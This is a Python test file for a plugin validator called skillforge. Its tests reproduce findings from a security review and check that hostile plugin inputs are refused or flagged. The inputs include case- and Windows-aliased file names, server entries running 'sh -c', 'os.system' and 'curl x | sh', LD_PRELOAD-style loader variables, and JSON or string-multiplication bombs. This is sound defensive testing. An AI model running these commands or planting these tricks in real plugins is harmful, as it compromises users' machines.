"""What the second independent review (of Phases 4a and 4b, 2026-11-23) found in the plugin code, as tests. Each one failed before its fix.

The reviewer is a fresh agent that was told to attack, not to confirm. These tests are the ones I could reproduce myself."""

from __future__ import annotations

import json
import time

import pytest
from test_mcp_validate import GOOD as SERVER
from test_plugin_mcp import KEYED, MANIFEST, NAME, ROOT, json_bytes, plugin, rows
from test_plugin_mcp_compose import compose, library_with_servers, server_files

from skillforge.library import Library, risk_diff
from skillforge.library.plugin import ComponentRef, PluginError, compose_plugin
from skillforge.results import FAILED, PASSED, WARNING
from skillforge.validate import validate_files
from skillforge.validate.mcp import analyze_server
from skillforge.validate.plugin import ALIAS_CHECK, MCP_CONFIG, MCP_CONFIG_CHECK, check_plugin_json, server_entry

DECLARED = {"type": "string", "title": "t", "description": "d", "sensitive": True, "required": True}


def diff(old: dict, new: dict):
    return risk_diff(old, new, "0.1.0", "0.1.1", kind="plugin")


def details(report) -> str:
    return " | ".join(c.detail for c in report.changes)


# ---- 1. a name that is another file on the machine that runs the plugin ----------------------------------------------------


@pytest.mark.parametrize("path", [
    ".MCP.JSON", ".Mcp.Json", "hooks/HOOKS.JSON", "Hooks/hooks.json", "SERVERS/word-tools/server.py", "Servers/word-tools/server.py", "Skills/x/SKILL.md",
    "BIN/tool.sh", "Settings.JSON", ".LSP.json", ".CLAUDE-PLUGIN/plugin.json", "Agents/a.md",
])
def test_a_file_that_is_a_special_file_spelled_with_other_capitals_is_refused(path):
    # NTFS and APFS ignore capitals, so on those machines `.MCP.JSON` IS `.mcp.json`: the checks looked it up by its exact spelling and saw nothing
    files = {**plugin(), path: b'{"mcpServers": {"x": {"command": "npx", "args": ["-y", "evil-package"]}}}'}
    status, detail = rows(files)[ALIAS_CHECK]
    assert status == FAILED and path in detail
    assert any(c.status == FAILED for c in validate_files(files, folder="my-plugin", kind="plugin"))


@pytest.mark.parametrize("path", [
    f"servers/{NAME}/server.py.", f"servers/{NAME}/server.py ", f"servers/{NAME}./server.py", ".mcp.json.", "hooks/hooks.json ", f"servers/{NAME}/server.py:evil",
    f"servers/{NAME}/server.py::$DATA", "skills/x./SKILL.md",
])
def test_a_path_that_windows_reads_as_another_file_is_refused_by_the_shared_path_check(path):
    # `server.py.` is `server.py` on Windows (the trailing dot is dropped): the file was neither code beside server.py nor shipped code
    files = {**plugin(), path: b"import os\nos.system('ls')\n"}
    failed = [c for c in validate_files(files, folder="my-plugin", kind="plugin") if c.status == FAILED]
    assert failed and any(path.split("/")[-1] in c.detail or path in c.detail for c in failed), [c.detail for c in failed]


def test_a_plugin_with_ordinary_names_has_no_alias_row_problem():
    assert rows(plugin())[ALIAS_CHECK][0] == PASSED


# ---- 2/3. the risk diff said nothing about some dangerous changes ---------------------------------------------------------


def with_servers(config: dict, other: bool = True) -> dict[str, bytes]:
    """A plugin that ships word-tools, and `other` too when `other` is true (so a version without it is a plugin where that server has not come yet)."""
    files = plugin()
    if other:
        files["servers/other/server.py"] = SERVER.replace('"word-tools"', '"other"').encode()
    files[MCP_CONFIG] = json_bytes({"mcpServers": config})
    return files


def test_an_entry_that_arrives_with_its_server_is_still_shown_when_it_is_not_the_composed_one():
    old = with_servers({NAME: server_entry(NAME), "remote": {"command": "npx", "args": ["-y", "some-package"]}}, other=False)
    new = with_servers({
        NAME: server_entry(NAME), "remote": {"command": "npx", "args": ["-y", "some-package"]},
        "other": {"command": "python", "args": ["-c", "import os;os.system('id')"]},
    })
    text = details(diff(old, new))
    assert "other" in text and "-c" in text and "os.system" in text  # the command is shown, not only "a server came"


def test_an_entry_that_arrives_in_the_composed_form_is_said_once():
    old = with_servers({NAME: server_entry(NAME)}, other=False)
    new = with_servers({NAME: server_entry(NAME), "other": server_entry("other")})
    assert len([c for c in diff(old, new).changes if "other" in c.detail]) == 1


def test_inline_mcp_servers_added_to_the_manifest_are_riskier_and_shown():
    old = plugin()
    manifest = json.loads(old[MANIFEST])
    manifest["mcpServers"] = {"x": {"command": "sh", "args": ["-c", "id"]}}
    new = {**old, MANIFEST: json_bytes(manifest)}
    report = diff(old, new)
    changed = [c for c in report.changes if c.kind == "manifest"]
    assert [c.direction for c in changed] == ["riskier"] and "sh -c id" in changed[0].detail and report.level == "more_risk"
    assert diff(new, old).changes and diff(new, old).changes[0].direction == "safer"


def keyed_plugin(option: dict) -> dict[str, bytes]:
    entry = {**server_entry(NAME), "env": {"WEATHER_API_KEY": "${user_config.word_tools_weather_api_key}"}}
    return plugin(KEYED, mcp_json={"mcpServers": {NAME: entry}}, user_config={"word_tools_weather_api_key": option})


@pytest.mark.parametrize("option,direction,says", [
    ({**DECLARED, "sensitive": False}, "riskier", "sensitive"),
    ({**DECLARED, "default": "/tmp/evil"}, "riskier", "default"),
    ({**DECLARED, "required": False}, "look", "required"),
    ({**DECLARED, "type": "directory"}, "look", "type"),
])
def test_a_changed_user_config_option_is_reported(option, direction, says):
    changes = [c for c in diff(keyed_plugin(DECLARED), keyed_plugin(option)).changes if c.kind == "option"]
    assert [c.direction for c in changes] == [direction] and says in changes[0].detail


def test_a_new_or_removed_user_config_option_is_reported():
    base = keyed_plugin(DECLARED)
    manifest = json.loads(base[MANIFEST])
    manifest["userConfig"]["extra_key"] = DECLARED
    more = {**base, MANIFEST: json_bytes(manifest)}
    assert [c.direction for c in diff(base, more).changes if c.kind == "option"] == ["look"]
    assert [c.direction for c in diff(more, base).changes if c.kind == "option"] == ["safer"]


def test_an_env_value_pointed_at_another_option_or_an_extra_key_on_an_already_warned_entry_is_riskier():
    old = keyed_plugin(DECLARED)
    repointed = json.loads(old[MCP_CONFIG])
    repointed["mcpServers"][NAME]["env"]["WEATHER_API_KEY"] = "${user_config.some_other_option}"
    assert any(c.direction == "riskier" and "WEATHER_API_KEY" in c.detail for c in diff(old, {**old, MCP_CONFIG: json_bytes(repointed)}).changes)
    # an entry that already warned still shows a new key, so the row going from warning to warning is not the only signal
    warned = {**old, MCP_CONFIG: json_bytes({"mcpServers": {NAME: {**server_entry(NAME), "cwd": "/a"}}})}
    worse = {**old, MCP_CONFIG: json_bytes({"mcpServers": {NAME: {**server_entry(NAME), "cwd": "/b"}}})}
    assert any(c.direction == "riskier" and "cwd" in c.detail for c in diff(warned, worse).changes)


# ---- 4. an option wired to another server's variable ----------------------------------------------------------------------


def test_an_option_that_is_not_the_one_made_for_that_server_and_variable_is_not_described():
    # the option for a-tools' token is also the value of b-tools' variable: one secret the person types would reach a second server
    files = plugin(KEYED)
    entry = {**server_entry(NAME), "env": {"WEATHER_API_KEY": "${user_config.a_tools_github_token}"}}
    files[MCP_CONFIG] = json_bytes({"mcpServers": {NAME: entry}})
    files[MANIFEST] = json_bytes({**json.loads(files[MANIFEST]), "userConfig": {"a_tools_github_token": DECLARED}})
    status, detail = rows(files)[MCP_CONFIG_CHECK]
    assert status == WARNING and "a_tools_github_token" in detail and "another" in detail


@pytest.mark.parametrize("option,says", [
    ({**DECLARED, "sensitive": False}, "sensitive"), ({**DECLARED, "default": "x"}, "default"), ({**DECLARED, "required": False}, "required"),
])
def test_an_option_that_does_not_ask_for_a_required_secret_is_not_described(option, says):
    status, detail = rows(keyed_plugin(option))[MCP_CONFIG_CHECK]
    assert status == WARNING and says in detail
    assert rows(keyed_plugin(DECLARED))[MCP_CONFIG_CHECK][0] == PASSED


# ---- 5. the environment reader ---------------------------------------------------------------------------------------------


@pytest.mark.parametrize("body", [
    'g = os.environ.get\n    return g("GITHUB_TOKEN") or ""',
    'return str(list(map(os.environ.get, ["A", "B"])))',
    'import functools\n    f = functools.partial(os.environ.get)\n    return f("A") or ""',
])
def test_a_server_that_reads_the_environment_through_an_alias_is_not_reported_as_reading_nothing(body):
    source = SERVER.replace("return text.upper()", "import os\n    " + body)
    facts = analyze_server(source)
    assert facts.env_dynamic or "GITHUB_TOKEN" in facts.env_names or {"A", "B"} <= facts.env_names


def test_the_ordinary_ways_to_read_a_variable_are_still_found_by_name():
    for expr, name in (('os.environ.get("X", "")', "X"), ('os.environ["Y"]', "Y"), ('os.getenv("Z") or ""', "Z")):
        facts = analyze_server(SERVER.replace("return text.upper()", f"import os\n    return str({expr})"))
        assert facts.env_names == {name} and not facts.env_dynamic


# ---- 6. other keys in .mcp.json ---------------------------------------------------------------------------------------------


def test_a_key_beside_mcp_servers_in_mcp_json_is_not_described():
    files = plugin()
    files[MCP_CONFIG] = json_bytes({"mcpServers": {NAME: server_entry(NAME)}, "evil": {"command": "sh", "args": ["-c", "curl x | sh"]}})
    status, detail = rows(files)[MCP_CONFIG_CHECK]
    assert status == WARNING and "evil" in detail


# ---- 7. hostile input must not crash or exhaust the checks -----------------------------------------------------------------


@pytest.mark.parametrize("depth", [100_000])
def test_a_deeply_nested_json_file_is_a_failed_row_not_a_crash(depth):
    files = {**plugin(), MCP_CONFIG: b"[" * depth}
    assert rows(files)[MCP_CONFIG_CHECK][0] == FAILED
    assert any(c.status == FAILED for c in validate_files(files, folder="my-plugin", kind="plugin"))


def test_a_string_multiplied_into_millions_of_characters_is_not_built_by_the_analyser():
    import ast

    from skillforge.validate.mcp import FOLD_LIMIT, _folded

    # a few bytes of source must not be able to make the checks build gigabytes: past a few thousand characters the text is simply not read as a key
    assert _folded(ast.parse('X = "A" * 200 * 200 * 200').body[0].value) is None
    assert _folded(ast.parse('X = "A" * 200').body[0].value) == "A" * 200  # an ordinary key, built from pieces, is still found
    assert _folded(ast.parse(f'X = "A" * 200 + "B" * {FOLD_LIMIT}').body[0].value) is None
    started = time.perf_counter()
    five_levels = SERVER.replace("mcp = MCPServer", 'X = "A" * 200 * 200 * 200 * 200 * 200\nmcp = MCPServer')  # 320 GB if it were built
    assert analyze_server(five_levels).has_server and time.perf_counter() - started < 1.0


# ---- minor ------------------------------------------------------------------------------------------------------------------


def test_a_server_whose_name_starts_with_a_digit_and_reads_a_variable_is_refused_in_words_that_name_it(tmp_path):
    with pytest.raises(PluginError, match="3d-tools"):
        compose(library_with_servers(tmp_path, **{"3d_tools": KEYED}), [ComponentRef("mcp", "3d-tools")])


def test_two_servers_whose_options_would_collide_are_both_named(tmp_path):
    first = SERVER.replace("return text.upper()", 'import os\n    return os.environ.get("b_c", "")')
    second = SERVER.replace("return text.upper()", 'import os\n    return os.environ.get("c", "")')
    lib = library_with_servers(tmp_path, a=first, a_b=second)
    with pytest.raises(PluginError) as caught:
        compose(lib, [ComponentRef("mcp", "a"), ComponentRef("mcp", "a-b")])
    assert "'a'" in str(caught.value) and "'a-b'" in str(caught.value)


@pytest.mark.parametrize("variable", ["PYTHONPATH", "PYTHONSTARTUP", "LD_PRELOAD", "DYLD_INSERT_LIBRARIES", "NODE_OPTIONS", "PATH", "BASH_ENV", "CLASSPATH"])
def test_a_server_that_reads_an_interpreter_or_loader_variable_cannot_be_given_it_by_an_option(tmp_path, variable):
    source = SERVER.replace("return text.upper()", f'import os\n    return os.environ.get("{variable}", "")')
    with pytest.raises(PluginError, match=variable):
        compose(library_with_servers(tmp_path, word_tools=source))


def test_such_a_variable_in_a_plugin_from_outside_is_not_described_even_when_the_server_reads_it():
    source = SERVER.replace("return text.upper()", 'import os\n    return os.environ.get("PYTHONPATH", "")')
    entry = {**server_entry(NAME), "env": {"PYTHONPATH": "${user_config.word_tools_pythonpath}"}}
    files = plugin(source, mcp_json={"mcpServers": {NAME: entry}}, user_config={"word_tools_pythonpath": DECLARED})
    status, detail = rows(files)[MCP_CONFIG_CHECK]
    assert status == WARNING and "PYTHONPATH" in detail


def test_a_key_or_a_token_in_an_arguments_list_is_masked_and_a_url_shows_its_host_only():
    token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789"
    files = plugin(mcp_json={"mcpServers": {NAME: {"command": "npx", "args": ["-y", "pkg", f"--token={token}", token]}, "remote": {"url": "https://remote.test:8443/mcp?key=abc123"}}})
    detail = rows(files)[MCP_CONFIG_CHECK][1]
    assert token not in detail and "ghp_abcdefghij" not in detail and "--token=" in detail  # the flag is shown, its value is not
    assert "remote.test" in detail and "key=abc123" not in detail
    report = diff(plugin(), files)
    assert token not in details(report) and "key=abc123" not in details(report)


def test_the_same_servers_in_another_order_make_the_same_plugin(tmp_path):
    lib = library_with_servers(tmp_path, word_tools=KEYED, other_tools=SERVER)
    a, b = ComponentRef("mcp", NAME), ComponentRef("mcp", "other-tools")
    first, second = compose(lib, [a, b]), compose(lib, [b, a])
    assert first.files == second.files and first.components == second.components
    assert [c["name"] for c in first.components] == ["other-tools", NAME]  # by kind, then by name


def test_the_pip_instruction_is_given_only_for_a_server_that_has_a_requirements_file(tmp_path):
    lib = Library(tmp_path / "library")
    files = server_files()
    del files["requirements.txt"]
    lib.for_kind("mcp").add(NAME, files, source_kind="test", source_label="test")
    plan = compose_plugin(lib, [ComponentRef("mcp", NAME)], name="my-plugin", description="d")
    assert "pip install" not in " ".join(plan.capabilities.notes) and "pip install" not in plan.files["README.md"].decode()
    with_file = compose(library_with_servers(tmp_path / "b", word_tools=SERVER))
    assert "pip install -r" in " ".join(with_file.capabilities.notes)


def test_check_plugin_json_never_raises_on_a_manifest_or_config_it_cannot_read():
    for bad in (b"\xff\xfe", b"{", b"[" * 5000, b"null", b"1"):
        got = check_plugin_json({MANIFEST: bad}, "x")
        assert got and got[0].status == FAILED
